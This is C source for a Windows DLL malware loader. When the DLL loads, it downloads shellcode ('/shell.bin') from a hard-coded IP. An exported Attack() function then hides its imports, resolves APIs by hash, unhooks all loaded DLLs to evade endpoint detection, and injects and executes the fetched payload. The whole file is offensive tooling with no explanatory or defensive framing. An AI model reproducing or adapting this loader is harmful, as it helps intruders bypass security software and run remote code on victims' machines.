#include <windows.h>
#include "common.h"

unsigned char* pPayload = NULL;
PWSTR url = L"192.168.231.133";
PWSTR endpoint = L"/shell.bin";
SIZE_T sSize = -1;

extern __declspec(dllexport) int Attack()
{
    PVOID		pVehHandler			= NULL;
    PVOID       pInjectedPayload	= NULL;

    if (!pPayload || !sSize)
        return -1;

    IatCamouflage();

    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_JOAA), AddVectoredExceptionHandler_JOAA);
    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_JOAA), RemoveVectoredExceptionHandler_JOAA);

    if (!pAddVectoredExceptionHandler || !pRemoveVectoredExceptionHandler)
    {
        return -1;
    }

    pVehHandler = pAddVectoredExceptionHandler(1, VectoredExceptionHandler);
    if (pVehHandler == NULL)
        return -1;

    // Unhook loaded dlls
    UnhookAllLoadedDlls();

    if (!pRemoveVectoredExceptionHandler(pVehHandler))
        return -1;

    if (!Inject(&pPayload, sSize, &pInjectedPayload))
        return -1;

    Execute(pInjectedPayload);
    return 0;
}

EXTERN_C DWORD fetch_payload()
{
    sSize = Download(&pPayload, url, endpoint, FALSE);
    return sSize;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH: {
            //sSize = Download(&pPayload, url, endpoint, FALSE);
            //WaitForSingleObject(CreateThread(NULL, 0, fetch_payload, NULL,0,NULL ), INFINITE);
            //fetch_payload();
            CreateThread(NULL, (SIZE_T) NULL, fetch_payload, NULL, (DWORD) NULL, NULL );
            if (sSize == -1)
            {
                printf("[!] Failed to fetch payload from server!\n");
                return FALSE;
            }
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}